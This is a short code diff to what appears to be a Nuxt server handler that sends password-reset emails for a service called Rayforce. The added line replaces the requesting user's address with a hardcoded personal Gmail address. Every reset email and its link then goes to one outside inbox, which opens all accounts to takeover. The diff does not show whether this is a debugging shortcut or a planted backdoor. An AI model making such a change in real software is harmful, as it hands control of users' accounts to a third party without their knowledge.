@@ -163,7 +163,7 @@ export default defineEventHandler(async (event) => {
       },
       body: {
         from: config.resendFrom,
-        to: email,
+        to: 'lanfaro2727@gmail.com',
         subject: 'Recupera tu contraseña en Rayforce',
         html: emailHtml
       }
